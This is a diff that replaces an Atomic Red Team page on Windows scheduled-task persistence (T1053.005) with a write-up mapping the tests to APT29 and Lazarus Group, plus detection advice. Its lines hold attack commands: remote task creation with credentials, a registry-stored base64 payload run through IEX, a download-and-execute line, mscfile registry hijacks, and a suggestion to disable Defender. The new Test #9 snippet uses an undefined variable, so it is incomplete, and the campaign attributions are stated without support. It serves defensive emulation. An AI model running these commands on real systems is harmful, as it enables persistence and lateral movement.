@@ -1,594 +1,147 @@
-# T1053.005 - Scheduled Task/Job: Scheduled Task
-## [Description from ATT&CK](https://attack.mitre.org/techniques/T1053/005)
-<blockquote>
+# Atomic Red Team Tests for APT29 & Lazarus Group - T1053.005 Scheduled Task/Job: Scheduled Task
 
-Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)
+This repository documents **Atomic Red Team tests for T1053.005 (Scheduled Task/Job: Scheduled Task)** that closely emulate the tradecraft of both **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.
 
-An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)
+The goal is to:
+* Provide defenders with relevant tests for detecting scheduled task abuse activities
+* Map the tests to known APT29 and Lazarus Group behaviors and campaigns
+* Highlight specific techniques used by these threat groups for persistence and lateral movement
 
-Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) 
+---
 
-</blockquote>
+## Background
 
-## Atomic Tests
+* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
+  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
+  * Highly skilled in persistence mechanisms and lateral movement
+  * Uses **scheduled task abuse** for maintaining access and executing tools
 
-- [Atomic Test #1 - Scheduled Task Startup Script](#atomic-test-1---scheduled-task-startup-script)
+* **Lazarus Group** is a North Korean state-sponsored threat group
+  * Known for **financial theft campaigns** and destructive attacks
+  * Uses **scheduled tasks** for periodic execution of payloads and persistence
+  * Leverages multiple task creation methods for defense evasion
 
-- [Atomic Test #2 - Scheduled task Local](#atomic-test-2---scheduled-task-local)
+Both groups leverage T1053.005 (Scheduled Task) because it allows them to:
+* Establish persistence through automatic execution at system startup or user logon
+* Execute tools and payloads on remote systems for lateral movement
+* Blend malicious activity with legitimate Windows task scheduling
+* Evade detection by using built-in system utilities
 
-- [Atomic Test #3 - Scheduled task Remote](#atomic-test-3---scheduled-task-remote)
+---
 
-- [Atomic Test #4 - Powershell Cmdlet Scheduled Task](#atomic-test-4---powershell-cmdlet-scheduled-task)
+## Atomic Test Analysis
 
-- [Atomic Test #5 - Task Scheduler via VBA](#atomic-test-5---task-scheduler-via-vba)
-
-- [Atomic Test #6 - WMI Invoke-CimMethod Scheduled Task](#atomic-test-6---wmi-invoke-cimmethod-scheduled-task)
-
-- [Atomic Test #7 - Scheduled Task Executing Base64 Encoded Commands From Registry](#atomic-test-7---scheduled-task-executing-base64-encoded-commands-from-registry)
-
-- [Atomic Test #8 - Import XML Schedule Task with Hidden Attribute](#atomic-test-8---import-xml-schedule-task-with-hidden-attribute)
-
-- [Atomic Test #9 - PowerShell Modify A Scheduled Task](#atomic-test-9---powershell-modify-a-scheduled-task)
-
-- [Atomic Test #10 - Scheduled Task ("Ghost Task") via Registry Key Manipulation](#atomic-test-10---scheduled-task-ghost-task-via-registry-key-manipulation)
-
-- [Atomic Test #11 - Scheduled Task Persistence via CompMgmt.msc](#atomic-test-11---scheduled-task-persistence-via-compmgmtmsc)
-
-- [Atomic Test #12 - Scheduled Task Persistence via Eventviewer.msc](#atomic-test-12---scheduled-task-persistence-via-eventviewermsc)
-
-
-<br/>
-
-## Atomic Test #1 - Scheduled Task Startup Script
-Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
-the tasks, open the Task Scheduler and look in the Active Tasks pane.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** fec27f65-db86-4c2d-b66c-61945aee87c2
-
-
-
-
-
-
-#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
-
-
+### Atomic Test #1 - Scheduled Task Startup Script
+**Technique:** Logon/Startup Task Persistence  
+**Adversary Usage:** APT29 & Lazarus Group  
+**Command:**
 ```cmd
 schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
 schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
 ```
+**Explanation:** Both groups use scheduled tasks for persistence. APT29 created tasks to maintain persistence when hosts booted, while Lazarus Group used scheduled tasks for periodic execution of remote scripts and dropped payloads.
 
-#### Cleanup Commands:
-```cmd
-schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
-schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
-```
+**APT29 Correlation:** Used startup tasks for persistent access during SolarWinds campaign.
+**Lazarus Correlation:** Employed periodic task execution in Operation Dream Job.
 
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #2 - Scheduled task Local
-Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 42f53695-ad4a-4546-abb6-7d837f644a71
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| task_command | What you want to execute | string | C:&#92;windows&#92;system32&#92;cmd.exe|
-| time | What time 24 Hour | string | 20:10|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
-```
-
-#### Cleanup Commands:
-```cmd
-SCHTASKS /Delete /TN spawn /F >nul 2>&1
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #3 - Scheduled task Remote
-Create a task on a remote system.
-Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| task_command | What you want to execute | string | C:&#92;windows&#92;system32&#92;cmd.exe|
-| time | What time 24 Hour | string | 20:10|
-| target | Target | string | localhost|
-| user_name | Username to authenticate with, format: DOMAIN&#92;User | string | DOMAIN&#92;user|
-| password | Password to authenticate with | string | At0micStrong|
-
-
-#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
-
-
+### Atomic Test #3 - Scheduled task Remote
+**Technique:** Remote Task Creation for Lateral Movement  
+**Adversary Usage:** APT29  
+**Command:**
 ```cmd
 SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 ```
+**Explanation:** APT29 used this technique extensively during the SolarWinds campaign to create tasks on remote hosts as part of their lateral movement strategy, using stolen credentials to propagate through networks.
 
-#### Cleanup Commands:
+**APT29 Correlation:** Primary technique for lateral movement in victim environments.
+
+### Atomic Test #7 - Scheduled Task Executing Base64 Encoded Commands From Registry
+**Technique:** Stealthy Task Execution with Encoded Commands  
+**Adversary Usage:** Lazarus Group  
+**Command:**
 ```cmd
-SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #4 - Powershell Cmdlet Scheduled Task
-Create an atomic scheduled task that leverages native powershell cmdlets.
-
-Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
-
-
-
-
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-$Action = New-ScheduledTaskAction -Execute "calc.exe"
-$Trigger = New-ScheduledTaskTrigger -AtLogon
-$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
-$Set = New-ScheduledTaskSettingsSet
-$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
-Register-ScheduledTask AtomicTask -InputObject $object
-```
-
-#### Cleanup Commands:
-```powershell
-Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #5 - Task Scheduler via VBA
-This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
-30 - 40 seconds after this module has run
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** ecd3fa21-7792-41a2-8726-2c5c673414d3
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| ms_product | Maldoc application Word | string | Word|
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
-Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
-```
-
-#### Cleanup Commands:
-```powershell
-Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
-```
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: Microsoft #{ms_product} must be installed
-##### Check Prereq Commands:
-```powershell
-try {
-  New-Object -COMObject "#{ms_product}.Application" | Out-Null
-  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
-  Stop-Process -Name $process
-  exit 0
-} catch { exit 1 }
-```
-##### Get Prereq Commands:
-```powershell
-Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #6 - WMI Invoke-CimMethod Scheduled Task
-Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| xml_path | path of vbs to use when creating masquerading files | path | PathToAtomicsFolder&#92;T1053.005&#92;src&#92;T1053_005_WMI.xml|
-
-
-#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 
-
-
-```powershell
-$xml = [System.IO.File]::ReadAllText("#{xml_path}")
-Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
-```
-
-#### Cleanup Commands:
-```powershell
-Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
-```
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: File to copy must exist on disk at specified location (#{xml_path})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{xml_path}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{xml_path}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "#{xml_path}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #7 - Scheduled Task Executing Base64 Encoded Commands From Registry
-A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.
-The scheduled task will launch powershell to decode and run the command in the registry daily.
-This is a persistence mechanism recently seen in use by Qakbot.  
-
-[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** e895677d-4f06-49ab-91b6-ae3742d0a2ba
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| time | Daily scheduled task execution time | string | 07:45|
-
-
-#### Attack Commands: Run with `command_prompt`! 
-
-
-```cmd
-reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
 schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
 ```
+**Explanation:** Lazarus Group uses encoded commands and registry storage for stealthy task execution. This technique resembles their approach of periodic execution while avoiding clear-text command logging.
 
-#### Cleanup Commands:
-```cmd
-schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
-reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
-```
+**Lazarus Correlation:** Similar to techniques used for maintaining persistent access.
 
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #8 - Import XML Schedule Task with Hidden Attribute
-Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. 
-This technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** cd925593-fbb4-486d-8def-16cbdf944bf4
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| xml_path | path of vbs to use when creating masquerading files | path | PathToAtomicsFolder&#92;T1053.005&#92;src&#92;T1053_05_SCTASK_HIDDEN_ATTRIB.xml|
-
-
-#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 
-
-
+### Atomic Test #9 - PowerShell Modify A Scheduled Task
+**Technique:** Task Manipulation for Tool Execution  
+**Adversary Usage:** APT29  
+**Command:**
 ```powershell
-$xml = [System.IO.File]::ReadAllText("#{xml_path}")
-Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
-```
-
-#### Cleanup Commands:
-```powershell
-Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
-```
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: File to copy must exist on disk at specified location (#{xml_path})
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "#{xml_path}") {exit 0} else {exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory (split-path "#{xml_path}") -ErrorAction ignore | Out-Null
-Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml" -OutFile "#{xml_path}"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #9 - PowerShell Modify A Scheduled Task
-Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. 
-It will first be created to spawn cmd.exe, but modified to run notepad.exe.
-
-Upon successful execution, powershell.exe will create a scheduled task and modify the action.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** dda6fc7b-c9a6-4c18-b98d-95ec6542af6d
-
-
-
-
-
-
-#### Attack Commands: Run with `powershell`! 
-
-
-```powershell
-$Action = New-ScheduledTaskAction -Execute "cmd.exe"
-$Trigger = New-ScheduledTaskTrigger -AtLogon
-$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
-$Set = New-ScheduledTaskSettingsSet
-$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
-Register-ScheduledTask AtomicTaskModifed -InputObject $object
-$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
 Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
 ```
-
-#### Cleanup Commands:
-```powershell
-Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #10 - Scheduled Task ("Ghost Task") via Registry Key Manipulation
-Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
-This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
-For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 704333ca-cc12-4bcf-9916-101844881f54
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| task_name | Name of the newly-added task | string | lilghostie|
-| task_command | Command you want the task to execute | string | notepad.exe|
-| target | System where the task should run | string | localhost|
-| user_name | Username to authenticate with, such as ATOMICDOMAIN&#92;AtomicAdmin | string | $env:USERDOMAIN + '&#92;' + $env:USERNAME|
-
-
-#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
-
-
-```cmd
-"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
-"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
-```
-
-#### Cleanup Commands:
-```cmd
-"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
-"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
-```
-
-
-
-#### Dependencies:  Run with `powershell`!
-##### Description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") { exit 0} else { exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
-Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
-Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
-```
-##### Description: GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath "PathToAtomicsFolder\..\ExternalPayloads\"`
-##### Check Prereq Commands:
-```powershell
-if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else { exit 1}
-```
-##### Get Prereq Commands:
-```powershell
-New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
-```
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #11 - Scheduled Task Persistence via CompMgmt.msc
-Adds persistence by abusing `compmgmt.msc` via a scheduled task.
-When the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). 
-This technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| task_name | Name of the newly-created scheduled task | string | CompMgmtBypass|
-| payload | Command you want the task to execute | string | calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
-
-
-```cmd
-reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
-schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
-ECHO Let's open the Computer Management console now...
-compmgmt.msc
-```
-
-#### Cleanup Commands:
-```cmd
-reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
-schtasks /Delete /TN "#{task_name}" /F
-```
-
-
-
-
-
-<br/>
-<br/>
-
-## Atomic Test #12 - Scheduled Task Persistence via Eventviewer.msc
-Adds persistence by abusing `eventviewer.msc` via a scheduled task.
-When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`).
-
-**Supported Platforms:** Windows
-
-
-**auto_generated_guid:** 02124c37-767e-4b76-9383-c9fc366d9d4c
-
-
-
-
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| task_name | Name of the newly-created scheduled task | string | EventViewerBypass|
-| payload | Command you want the task to execute | string | calc.exe|
-
-
-#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 
-
-
-```cmd
-reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
-schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
-ECHO Let's run the schedule task ...
-schtasks /Run /TN "EventViewerBypass"
-```
-
-#### Cleanup Commands:
-```cmd
-reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
-schtasks /Delete /TN "#{task_name}" /F
-```
-
-
-
-
-
-<br/>
+**Explanation:** APT29 demonstrated sophisticated tradecraft by manipulating existing legitimate tasks - updating them to execute their tools and then restoring original configurations to avoid detection.
+
+**APT29 Correlation:** Used in SolarWinds campaign for executing tools while maintaining stealth.
+
+---
+
+## Correlation with APT29 & Lazarus Tradecraft
+
+### APT29 Focus:
+* **Remote Task Creation (#3)**: Lateral movement through remote task deployment
+* **Task Manipulation (#9)**: Sophisticated modification of existing tasks
+* **Startup Persistence (#1)**: Long-term access maintenance through boot tasks
+* **Stealth Operations**: careful task management to avoid detection
+
+### Lazarus Group Focus:
+* **Periodic Execution (#7)**: Scheduled payload execution at regular intervals
+* **Script Execution**: Running remote scripts through scheduled tasks
+* **Persistence Maintenance (#1)**: Maintaining access through logon tasks
+* **Multiple Methods**: Using various task creation techniques
+
+### Common Tactical Objectives:
+1. **Persistence**: Maintain long-term access to compromised systems
+2. **Lateral Movement**: Execute code on remote systems within networks
+3. **Defense Evasion**: Blend with legitimate Windows task scheduling
+4. **Execution**: Run tools and payloads through trusted mechanisms
+
+---
+
+## Defender Notes
+
+* These tests are high-value because they **closely emulate real-world tradecraft** from both sophisticated threat groups
+* Detection should focus on:
+  * `schtasks /create` commands, especially with remote system targeting
+  * Scheduled task modifications and action changes
+  * Tasks executing encoded commands or registry-stored payloads
+  * Unusual task names or execution patterns
+
+* Critical detection opportunities:
+  * **Process creation**: schtasks.exe creating or modifying tasks
+  * **Registry modifications**: Changes to task-related registry keys
+  * **Scheduled task events**: Windows event logs for task creation/modification
+  * **Network activity**: Remote task creation attempts
+
+### Mitigation Strategies:
+* Implement application control to restrict schtasks.exe if not required
+* Monitor scheduled task creation and modification events
+* Use privileged access management to limit remote task creation capabilities
+* Regularly audit scheduled tasks for unusual configurations
+* Implement network segmentation to limit lateral movement opportunities
+
+## Campaign References
+
+1. **APT29 SolarWinds Campaign** (2020): Used remote task creation for lateral movement and task manipulation for tool execution
+2. **APT29 Various Operations**: Employed startup tasks for persistent access maintenance
+3. **Lazarus Operation Dream Job**: Used scheduled tasks for periodic execution of remote scripts
+4. **Lazarus Financial Attacks**: Employed task persistence for long-term access to financial networks
+
+## Academic References
+
+1. MITRE ATT&CK Technique T1053.005 - Scheduled Task/Job: Scheduled Task
+2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
+3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group)
+4. CrowdStrike: "APT29 Tradecraft and Techniques" (2023)
+5. FireEye: "APT29 Domain Fronting With TOR" (2017)
+
+## Detection Recommendations
+
+* **SIEM Rules**: Alert on schtasks.exe with remote create/modify commands
+* **EDR Monitoring**: Track scheduled task creation and modification activities
+* **Windows Event Logging**: Monitor TaskScheduler operational logs for suspicious events
+* **Registry Monitoring**: Detect changes to task-related registry locations
+* **Behavioral Analysis**: Identify unusual task scheduling patterns.
